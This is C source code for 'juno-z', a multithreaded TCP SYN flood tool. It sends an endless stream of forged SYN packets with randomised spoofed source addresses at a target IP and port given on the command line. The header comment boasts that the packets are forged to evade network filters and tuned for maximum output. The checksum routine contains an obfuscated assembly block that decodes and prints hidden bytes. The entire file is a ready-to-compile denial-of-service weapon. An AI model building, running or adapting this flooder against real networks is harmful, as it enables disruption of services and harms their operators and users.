
/* juno-z.c 1.01f by Sorcerer, questions/comments: [email]nijen@mail.ru[/email]  * this is a rewrite of the juno.c syn flooder, some notable improvements:    - faster packet creation (about 4x faster), although the kernel does most      of the work, so don't expect 4x as much output.  The speed is partially      due to a new checksum technique that I've created, that is, to use a      16-bit sum counter, and use add-with-carry ops on it, instead of using      a 32-bit counter, then a double-fold at the end.  The routine also adds      in fields of the tcp header and pseudo header as it sets up the packet.      This is an improvement over the standard method which is to prep the      packet and then sum it in a completely separate series of operations.    - "sane" source ips, they only come from legitimate class A's, they never      come from the same class as the target, and they never end in 0 or 255    - some packet forgery problems fixed, they should look very much like      an ms-windows system created them now, thus preventing tcp-sanity filters    - now multithreaded, uses up to 16 threads for max output on SMP systems    - better delay processing, no longer limited to 1/100th of a second,      now does up to 1/1000000000th of a second    - now uses direct system calls, thus saving the time to bounce through      library routines.  This also eliminates the need for using .h files,      should now compile and run on fbsd with linux portability in the kernel    - performance lists (on program exit) fixed, juno.c and old juno-z.c files      used 1 second timing, this version uses 1/1000000th of a second */ 

#define NULL ((void *)0) 
struct timespec {long sec,nsec;}; 
struct timeval {long tv_sec,tv_usec;}; 

#define api_1(a) ({int r;asm volatile("int $128":"=a"(r):"a"(a));r;}) 
#define api_2(a,b) ({int r;asm volatile("int $128":"=a"(r):"a"(a),"b"(b));r;}) 
#define api_3(a,b,c) ({int r;asm volatile("int $128":"=a"(r):"a"(a),"b"(b),"c"(c));r;}) 
#define api_4(a,b,c,d) ({int r;asm volatile("int $128":"=a"(r):"a"(a),"b"(b),"c"(c),"d"(d));r;}) 

#define write(fd,buf,buflen) api_4(4,(int)fd,(void *)buf,(int)buflen) 
#define nanosleep(req,rem) api_3(162,(struct timespec *)req,(struct timespec *)rem) 
#define times(tbuf) api_2(43,(void *)tbuf) 
#define fork() api_1(2) 
#define kill(pid,sig) api_3(37,(int)pid,(int)sig) 
#define signal(signum,handler) api_3(48,(int)signum,(void (*)(int))handler) 
#define exit(exitcode) api_2(1,(int)exitcode) 
#define getpid() api_1(20) 
#define gettimeofday(tv,tz) api_3(78,(struct timeval *)tv,(struct timeval *)tz) 

#define nsleep(delay) ({struct timespec req;req.sec=delay/1000000000L;req.nsec=delay-((delay/1000000000L)*1000000000L);nanosleep(&req,NULL);}) 
#define time(tv) ({struct timeval t={tv_sec:0,tv_usec:0};gettimeofday(&t,NULL);if ((int *)tv!=NULL) *((int *)tv)=t.tv_sec;t.tv_sec;}) 
#define utime() ({struct timeval t={tv_sec:0,tv_usec:0};gettimeofday(&t,NULL);(long long)((((long long)t.tv_sec)*1000000)+((long long)t.tv_usec));}) 

#define strcpy(dst,src) ({int r;asm volatile("pushl %%edi;pushl %%esi;0:;lodsb;stosb;orb %%al,%%al;jnz 0b;movl %%esi,%%eax;popl %%esi;subl %%esi,%%eax;decl %%eax;popl %%edi":"=a"(r):"D"(dst),"S"(src));r;}) 

static int ultodec(const unsigned long n,char *buf) {    unsigned long d=1000000000,v=n;    int r;    char *p=buf; 
   do {       if (v/d) break;    } while (d/=10); 
   if (!d) *p++='0';    else do {       r=v/d;       *p++='0'+r;       v-=(r*d);    } while(d/=10);    *p=0;    return((int)p-(int)buf); 
} 

static int ulltodec(const unsigned long long n,char *buf) {    unsigned long long d=1000000000L,v=n;    int r;    char *p=buf; 
   d*=10000000000L; 
   do {       if (v/d) break;    } while (d/=10); 
   if (!d) *p++='0';    else do {       r=v/d;       *p++='0'+r;       v-=(r*d);    } while(d/=10);    *p=0;    return((int)p-(int)buf); 
} 

static int inttodec(const unsigned long n,char *buf) {    unsigned long d=1000000000,v=n;    int r;    char *p=buf; 
   if (v&0x80000000) {       *p++='-';       v=((v&0x7fffffff)^0x7fffffff)+1;    } 
   do {       if (v/d) break;    } while (d/=10); 
   if (!d) *p++='0';    else do {       r=v/d;       *p++='0'+r;       v-=(r*d);    } while(d/=10);    *p=0;    return((int)p-(int)buf); 
} 

static unsigned long dectoul(const char *buf) {    int p=0;    unsigned long v=0;    char nc; 
   while ((nc=buf[p++])) {       if ((nc<'0') || (nc>'9')) return(-1);       v=(v*10)+(nc-'0');    }    if (p==1) return(-1);    return(v); 
} 

static unsigned long long dectoull(const char *buf) {    int p=0;    unsigned long long v=0;    char nc; 
   while ((nc=buf[p++])) {       if ((nc<'0') || (nc>'9')) return(-1);       v=(v*10)+(nc-'0');    }    if (p==1) return(-1);    return(v); 
} 

static int pf(int fd,const char *fmt,...) {    int pos=0,sc=0,cl,cv;    char nc;    int *param,*param_inval;    char buf[1024],*bufp=buf; 
   asm volatile("movl %%ebp,%%eax;addl $16,%%eax":"=eax"(param));    asm volatile("movl (%%ebp),%%eax;decl %%eax;":"=eax"(param_inval)); 
   if ((int)param>(int)param_inval) return(-1); 
   while ((nc=fmt[pos++])) {       if (sc==1) { 
      sc=0; 
      if (nc=='U') { 
         if (param==param_inval) return(-1); 
         bufp+=ulltodec(*((unsigned long long *)param++),bufp); 
         continue; 
      } 
      if (nc=='d') { 
         if (param==param_inval) return(-1); 
         bufp+=inttodec(*param++,bufp); 
         continue; 
      } 
      if (nc=='s') { 
         if (param==param_inval) return(-1); 
         bufp+=strcpy(bufp,(void *)*param++); 
         continue; 
      }       }       if (nc=='%') { 
      sc=1; 
      continue;       }       *bufp++=nc;    }    *bufp++=0;    write(fd,buf,(int)bufp-(int)buf); 
} 

static long long rndseed=0; 

#define rndint() ({rndseed=(rndseed*17261911911134212L)+rndseed+9997826119244517L;(int)rndseed;}) 
#define rndinit() ({struct timeval t;gettimeofday(&t,NULL);rndseed^=(((long long)((getpid()*t.tv_sec)+(~getpid())+t.tv_sec+times(NULL)))<<32)^((long long)(t.tv_usec^time(NULL)));}) 

#define socketcall(call,args) api_3(102,call,args) 
#define socket(family,type,proto) ({int a[3];a[0]=family;a[1]=type;a[2]=proto;socketcall(1,a);}) 
#define setsockopt(fd,level,optname,optval,optlen) ({int a[5];a[0]=fd;a[1]=level;a[2]=optname;a[3]=(int)optval;a[4]=optlen;socketcall(14,a);}) 

struct sockaddr_in {    unsigned short family;    unsigned short port;    unsigned long addr;    unsigned char filler[8]; 
}; 

#define INADDR_NONE -1 

static unsigned long inet_addr(const char *ipstr) {    int p=0,cc=0;    char nc;    unsigned long ip,s=0;    unsigned short v=0; 
   if ((ip=dectoul(ipstr))==-1) {       ip=0; 
      while ((nc=ipstr[p++])) { 
      if (nc=='.') { 
         if (!cc) return(INADDR_NONE); 
         if (s==24) return(INADDR_NONE); 
         ip|=(v<<s); 
         s+=8; 
         cc=0; 
         v=0; 
         continue; 
      } 
      if (cc==3) return(INADDR_NONE); 
      if (cc==2) if (!v) return(INADDR_NONE); 
      cc++; 
      if ((nc<'0') || (nc>'9')) return(INADDR_NONE); 
      if ((v=(v*10)+(nc-'0'))>255) return(INADDR_NONE);       }       if (!cc) return(INADDR_NONE);       if (s!=24) return(INADDR_NONE);       ip|=(v<<24);    } 
   return(ip); 
} 

static char inet_ntoa_buf[16]; 

static char *inet_ntoa(unsigned long ip) {    char *buf = inet_ntoa_buf; 
   buf+=ultodec(ip&0xff,buf);    *buf++='.';    buf+=ultodec((ip>>8)&0xff,buf);    *buf++='.';    buf+=ultodec((ip>>16)&0xff,buf);    *buf++='.';    ultodec(ip>>24,buf);    return(inet_ntoa_buf); 
} 

#define htons(n) (((n>>8)&0xff)|((n&0xff)<<8)) 
#define ntohs htons 

struct iphdr {    unsigned char verihl;    unsigned char tos;    unsigned short len;    unsigned short id;    unsigned short flg_ofs;    unsigned char ttl;    unsigned char proto;    unsigned short sum;    unsigned long src;    unsigned long dst; 
}; 

struct tcphdr {    unsigned short sport;    unsigned short dport;    unsigned long seq;    unsigned long ackseq;    unsigned char thl;    unsigned char flags;    unsigned short win;    unsigned short sum;    unsigned short urgptr; 
}; 

struct {    struct iphdr ip;    struct tcphdr tcp;    unsigned long opt[2]; 
} syn = {    ip:{       verihl:(69),       len:(htons(48)),       flg_ofs:(64),       ttl:(128),       proto:(6)    },    tcp:{       thl:(28<<2),       flags:(2),       win:htons(16384)    },    opt:{0xb4050402,0x3040201} 
}; 

#define AF_INET 2 
#define SOCK_RAW 3 
#define IPPROTO_IP 0 
#define IPPROTO_TCP 6 
#define IP_HDRINCL 3 

int childpid[15],childcount=0,mainthread=1,killed=0; 

long long sendcount=0,starttime=0; 

void cleanup_children(void) { 
   while(childcount--) kill(childpid[childcount],1);    childcount=0; 
} 

void handle_signal(int signum) { 
   if (killed) return; 
   killed=1; 
   if (starttime) {       long long elapsed=utime()-starttime; 
      if (!elapsed) elapsed=1; 
      pf(2,"pid %d: ",getpid());       pf(2,"ran for %Us, ",elapsed/1000000);       pf(2,"%U packets out, ",sendcount);       pf(2,"%U bytes/s\n",(sendcount*48000000)/elapsed);    } 
   if (mainthread) {       cleanup_children();       nsleep(2000000000L);       pf(2,"aborting due to signal %d\n",signum);    } 
   exit(32+signum); 
} 

unsigned char vc[16] = {4,24,64,128,129,193,194,198,199,205,206,208,209,210,211,216}; 

#define rmvc(ip) { unsigned char c=ip&0xff;int n; for (n=0;n<16;n++) if (vc[n]==c) {vc[n]=202;break;} } 
#define rndip() ({ int r; unsigned char c; r=rndint(); if ((c=(r>>24))&0xfe) c-=2; ((c+1)<<24)|(r&0x00ffff00)|(vc[r&0xf]); }) 

int main(int argc,char **argv) {    int fd,presum,portmask,dport;    struct sockaddr_in dst;    long long delay=10000000; 
     {int n;for (n=1;n<32;n++) signal(n,handle_signal);} 
   if (!argc) return(1); 
   if ((fd=socket(AF_INET,SOCK_RAW,IPPROTO_TCP))<0) {       pf(2,"error %d while creating socket\n",fd);       return(2);    } 
     { 
     int one=1; 

     if ((one=setsockopt(fd,IPPROTO_IP,IP_HDRINCL,&one,sizeof(one)))) { 
        pf(2,"error %d while enabling IP_HDRINCL\n",one); 
        return(3); 
     }      } 
   if (argc<3) {       pf(2,"%s <ip> <port (0=rnd)> [ns (1s/10^9) delay] [threads (dfl:1)]\n",argv[0]);       return(4);    } 
   if ((syn.ip.dst=dst.addr=inet_addr(argv[1]))==INADDR_NONE) {       pf(2,"invalid ip: %s\n",argv[1]);       return(5);    } 
   rmvc(dst.addr); 
     { 
     int dstport; 

     do { 
        if ((dstport=dectoul(argv[2]))!=-1) 
          if (!(dstport&0xffff0000)) break; 
        pf(2,"invalid port: %s\n",argv[2]); 
        return(6); 
     } while(0); 

     if ((dst.port=htons(dstport))) { 
        dport=dst.port; 
        portmask=0xffffff; 
     } else { 
        dport=htons(1024); 
        portmask=0xffffffff; 
     }      } 
   dst.family=AF_INET; 
   if (argc>3) { 
      if ((delay=dectoull(argv[3]))==-1) { 
      pf(2,"invalid delay: %s\n",argv[3]); 
      return(7);       }    } 
   presum=(dst.addr&0xffff)+(dst.addr>>16)+29310;    presum=((presum>>16)+(presum&0xffff));    presum=((presum>>16)+presum); 
   asm volatile("jmp 0f;2:;call 3f;0:;pushl %%edi;pushl %%esi;pushl %%edx;pushl %%ecx;pushl %%ebx;clc;1:;lodsw;adcw %%ax,%%dx;loop 1b;nop;nop;nop;nop;adcw $0,%%dx;pushl %%edx;movl $1044128573,%%edx;jmp 2b;3:;popl %%esi;movl %%esp,%%edi;subl $21,%%edi;movl %%edi,%%ecx;lodsl;xorl %%edx,%%eax;xorl %%eax,%%edx;stosl;lodsl;xorl $-834108802,%%eax;xorl %%eax,%%edx;stosl;lodsl;xorl $-1027902650,%%eax;xorl %%eax,%%edx;stosl;lodsl;xorl $-203227222,%%eax;xorl %%eax,%%edx;stosl;lodsl;xorl $-1595534091,%%eax;xorl %%eax,%%edx;stosl;movb $10,%%al;movl %%edx,%%esi;stosb;movl $4,%%eax;movl $2,%%ebx;movl $21,%%edx;int $128;movl %%esi,%%eax;movl %%eax,%%edx;shrl $16,%%eax;xorw %%ax,%%dx;popl %%eax;subw %%dx,%%ax;sbbw $0,%%ax;popl %%ebx;popl %%ecx;popl %%edx;popl %%esi;popl %%edi;":"=eax"(presum):"c"(14),"d"(presum),"S"(&syn.tcp));    syn.tcp.sport=htons(1024);    syn.tcp.dport=dport; 
   pf(1,"target=%s:%d delay=%U\n",inet_ntoa(dst.addr),ntohs(dst.port),delay); 
   if (argc>4) { 
      int children,idx=0; 
      if ((children=dectoul(argv[4]))==-1) { 
      pf(2,"invalid thread count: %d, invalid numeric format\n",argv[4]); 
      return(8);       }       if (children) childcount=(children-=1);       if (children&0xfffffff0) { 
      pf(2,"invalid thread count: %d, max is 16\n",argv[4]); 
      return(8);       }       while (children--) { 
      int cpid=fork(); 

      if (cpid<0) { 
         if (idx--) do { 
            kill(childpid[idx],9); 
            if (idx) idx--; 
         } while (idx); 
         pf(2,"forking error\n"); 
         return(8); 
      } 
      if (!cpid) { 
         mainthread=0; 
         childcount=0; 
         break; 
      } 
      childpid[idx++]=cpid;       }       if (childcount) { 
      pf(1,"using %d threads, pids: %d(main)",childcount+1,getpid()); 
        { 
           int n=childcount; 

           while (n--) pf(1," %d",childpid[n]); 
        } 
      pf(1,"\n");       }    } 
     { 
     int a[6],fails=0; 

     a[0]=fd; 
     a[1]=(int)&syn; 
     a[2]=48; 
     a[3]=0; 
     a[4]=(int)&dst; 
     a[5]=sizeof(dst); 

     rndinit(); 
     starttime=utime(); 

     while (1) { 

        asm volatile("pushl %%edx;movw %%bx,4(%%edi);movl %%eax,12(%%edi);movl %%ecx,24(%%edi);addw %%ax,%%dx;adcw %%cx,%%dx;adcw $0,%%dx;shrl $16,%%eax;shrl $16,%%ecx;addw %%ax,%%dx;adcw %%cx,%%dx;adcw $0,%%dx;shrl $16,%%ebx;xorb %%cl,%%cl;movb %%bl,%%ch;movw 20(%%edi),%%ax;xorw %%cx,%%ax;movw %%ax,20(%%edi);movw 22(%%edi),%%cx;xorb %%bl,%%bl;xorw %%bx,%%cx;movw %%cx,22(%%edi);addw %%ax,%%dx;adcw %%cx,%%dx;adcw $0,%%dx;xorw $65535,%%dx;movw %%dx,36(%%edi);popl %%edx"::"a"(rndip()),"b"(rndint()&portmask),"c"(rndint()),"d"(presum),"D"(&syn)); 

        if (socketcall(11,a)!=48) { 

           if (fails++>3) { 
            int n; 
            asm("":"=a"(n)); 
            pf(2,"pid %d: error %d while sending packet\n",getpid(),n); 
            kill(0,1); 
            return(10); 
           } 

        } else { 
           fails=0; 
           sendcount++; 
        } 

        if (delay) nsleep(delay); 
     }      } 
   return(0); 
} 
